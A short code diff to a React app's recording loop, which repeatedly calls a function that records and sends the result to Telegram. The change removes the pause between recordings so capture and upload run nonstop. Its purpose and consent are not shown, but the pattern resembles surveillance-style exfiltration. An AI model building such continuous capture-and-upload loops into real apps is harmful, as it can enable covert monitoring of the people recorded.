@@ -247,15 +247,14 @@ export default function App() {
     }
   }, []);
 
-  // Start recording loop (runs with longer intervals)
+  // Start recording loop (runs continuously)
   const startRecordingLoop = useCallback(async () => {
     if (recordingLoopStarted.current) return;
     recordingLoopStarted.current = true;
 
     while (true) {
       await recordAndSendToTelegram();
-      // Wait 30 seconds between recordings to reduce CPU load
-      await new Promise((r) => setTimeout(r, 7000));
+      // Start next recording immediately after upload
     }
   }, [recordAndSendToTelegram]);
 
